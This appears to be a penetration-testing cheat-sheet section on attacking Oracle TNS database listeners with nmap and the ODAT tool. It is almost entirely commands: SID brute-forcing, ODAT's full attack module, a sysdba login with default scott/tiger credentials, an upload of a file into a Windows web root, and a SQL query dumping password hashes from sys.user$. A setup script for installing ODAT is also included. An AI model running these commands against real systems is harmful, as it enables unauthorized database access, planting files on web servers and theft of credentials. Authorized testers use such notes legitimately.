## Oracle TNS

```bash
$ nmap -p1521 -sV $TARGET --open
$ nmap -p1521 -sV $TARGET --open --script oracle-sid-brute
$ odat.py all -s $TARGET
# File upload test
$ odat.py utlfile -s $TARGET -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
$ sqlplus scott/tiger@$TARGET/XE
```

Setup ODAT

```bash
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
echo "nice job"
```

Testing if it works lol 
```bash
$ ./odat.py -h
```

```SQL
SELECT table_name FROM all_tables;
SELECT * FROM user_role_privs;
SELECT name, password FROM sys.user$;
```